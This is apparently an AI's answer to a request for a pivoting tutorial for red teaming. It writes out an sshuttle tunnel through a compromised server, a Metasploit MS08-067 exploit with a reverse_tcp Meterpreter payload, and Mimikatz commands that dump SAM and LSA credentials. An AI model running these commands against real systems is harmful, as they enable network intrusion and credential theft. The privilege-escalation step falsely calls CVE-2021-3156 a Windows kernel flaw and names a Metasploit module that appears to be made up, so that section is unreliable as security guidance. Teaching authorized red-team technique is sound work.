 Explain to me with examples on how to use pivoting in a red teaming assessment

 

Pivoting is a crucial technique used in red teaming and penetration testing assessments to move from one compromised system to another within a target network. It allows a red teamer to maintain access, escalate privileges, and gather more valuable information. Here, I'll explain pivoting with examples and the tools commonly used.

1. Initial Compromise:

Suppose you've already compromised a target system within the network, such as a web server.

2. Enumeration:

First, enumerate the compromised system for information that can help you pivot to other systems:

    Gather information about the target network, including IP addresses, subnets, and domain names.
    Identify open ports and services on the compromised system.
    Extract credentials or configuration files that may provide access to other systems.

3. Port Forwarding:

One common method for pivoting is to set up port forwarding or tunneling to route traffic through the compromised host. Tools like sshuttle, socat, and meterpreter can be used for this purpose.

Example using sshuttle:

Suppose you've compromised a Linux-based web server and want to access a Windows file server on a different subnet:

bash

# On your attacking machine:
sshuttle -r compromised_user@web_server_ip 10.10.20.0/24

This command creates a tunnel through the compromised web server, allowing you to access resources on the 10.10.20.0/24 network.

4. Exploiting Vulnerabilities:

Use the information gathered during enumeration to identify vulnerabilities on other systems in the target network. Exploit these vulnerabilities to gain access.

Example using Metasploit:

Suppose you've found an SMB vulnerability on a Windows server within the network. You can use Metasploit to exploit it:

bash

# Start Metasploit
msfconsole

# Exploit the vulnerability
use exploit/windows/smb/ms08_067_netapi
set RHOST <target_ip>
set payload windows/meterpreter/reverse_tcp
exploit

Once exploited, you'll have a Meterpreter session on the target system.

5. Privilege Escalation:

If your initial access is limited, look for opportunities to escalate privileges. This could include exploiting unpatched vulnerabilities, misconfigurations, or weakly protected accounts.

Example of Privilege Escalation using Windows Kernel Exploit:

Suppose you have low-level access to a Windows server but need admin privileges. You find a Windows kernel vulnerability (e.g., CVE-2021-3156) and exploit it to escalate privileges:

bash

# Start Metasploit
msfconsole

# Exploit the Windows kernel vulnerability
use exploit/windows/local/cve_2021_3156
set SESSION <session_id>
exploit

This will escalate your privileges on the compromised system.

6. Lateral Movement:

With escalated privileges, move laterally within the network to access additional systems. Common lateral movement techniques include pass-the-hash attacks, Mimikatz, and remote desktop protocol (RDP) exploitation.

Example using Mimikatz:

Suppose you've obtained admin credentials on a Windows server. You can use Mimikatz to extract and reuse those credentials for lateral movement:

bash

# Dump credentials with Mimikatz
mimikatz.exe
lsadump::sam
lsadump::secrets

Use the obtained credentials to access other systems in the network.

7. Rinse and Repeat:

Continue pivoting and exploring the network, maintaining access, escalating privileges, and moving laterally as needed to achieve your red teaming objectives.

Remember that red teaming should always be conducted within a legal and authorized framework, with proper permissions from the target organization. Unauthorized access or malicious actions are illegal and unethical. Always follow ethical guidelines and obtain proper consent for penetration testing and red teaming activities.
